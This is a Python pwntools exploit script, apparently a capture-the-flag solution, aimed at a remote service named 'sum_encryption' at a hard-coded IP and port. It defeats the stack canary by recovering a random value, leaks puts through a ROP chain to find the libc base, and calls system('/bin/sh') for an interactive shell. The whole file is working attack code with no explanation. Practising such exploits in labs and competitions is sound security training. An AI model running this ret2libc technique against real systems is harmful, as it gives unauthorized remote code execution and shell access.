from pwn import *

BIN = './sum_encryption'
elf = ELF(BIN)
rop = ROP(BIN)

# LIBC = '/lib/x86_64-linux-gnu/libc.so.6'
LIBC = './libc.so.6'
libc = ELF(LIBC)

def write_to_stack(values=[]):
	arr_len = 18
	p.recvuntil(b'values:\n')
	p.sendline(str(arr_len).encode())
	p.recvline()

	for i in range(arr_len - 1):
		p.sendline(b'0')
	for val in values:
		p.sendline(str(val).encode())
	p.sendline(b'\4')

	if values:
		p.recvuntil(b'values:\n')
		p.sendline(b'0')

# p = process(BIN)
p = remote('141.85.224.106', 31346)

aux = process('./get_rand')
rand = int(aux.recvline()[:-1].decode())
aux.close()

write_to_stack()
p.recvuntil(b'is: ')
canary = rand ^ int(p.recvline().rstrip().decode())
print(canary)

rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
main = 0x4008e1

write_to_stack([canary, 0, rdi, elf.got['puts'], elf.symbols['puts'], main])
leak = p.recvline().rstrip()
puts = u64(leak + b'\x00' * (8 - len(leak)))
libc.address = puts - libc.symbols['puts']
bin_sh = next(libc.search(b'/bin/sh\x00'))

write_to_stack([canary, 0, ret, rdi, bin_sh, libc.symbols['system']])

p.interactive()
